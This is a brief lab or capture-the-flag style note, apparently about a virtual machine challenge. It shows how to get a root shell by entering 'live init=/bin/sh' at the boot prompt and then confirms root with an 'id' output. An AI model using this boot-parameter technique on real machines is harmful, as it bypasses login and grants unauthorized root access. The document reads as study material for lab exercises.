Startup script exploit:

At the Vm's Startup we decide to change how to boot the VM

When the vm start  hit key :
    
    ctr+alt+f1
    boot: live init=/bin/sh

doing so we say our startup script is /bin/sh so it will open us a shell 

    #id
    uid=0(root) gid=0(root) groups=0(root)
